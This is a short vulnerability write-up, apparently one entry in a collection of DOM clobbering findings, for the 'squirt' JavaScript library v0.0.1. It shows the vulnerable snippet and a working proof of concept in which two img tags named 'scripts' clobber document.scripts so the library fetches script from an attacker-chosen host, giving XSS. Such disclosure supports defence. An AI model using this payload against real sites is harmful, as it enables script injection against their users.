## squirt

### Meta

+ Library: squirt
+ Stars: 1.2K
+ Version: v0.0.1
+ Fingerprint: `typeof window.sq !== 'undefined'`
+ Payload: ```<img name="scripts" src="http://xxx.xxx.xxx"><img name="scripts" src="http://xxx.xxx.xxx">```
+ Impact: XSS
+ Status: Reported
+ CVE: N/A
+ Foundby: TheHulk

### Library

URL:
+ `https://github.com/cameron/squirt/tree/master`

### Vulnerable Code Snippet

```javascript
var sq = window.sq;
sq.version = '0.0.1';
sq.host =  window.location.search.match('sq-dev') ?
  document.scripts[document.scripts.length - 1].src.match(/\/\/.*\//)[0]
        : '//www.squirt.io/bm/';
```


## PoC

Visit the page: `http://10.161.159.131:8080/squirt/poc.html?sq-dev=localhost:9999`

```html
<!--Library-->
<script src="./squirt.js"></script>
<!--Library-->

<!--Payload-->
<img name="scripts" src="http://localhost:9999">
<img name="scripts" src="http://localhost:9999">
<!--Payload-->
```

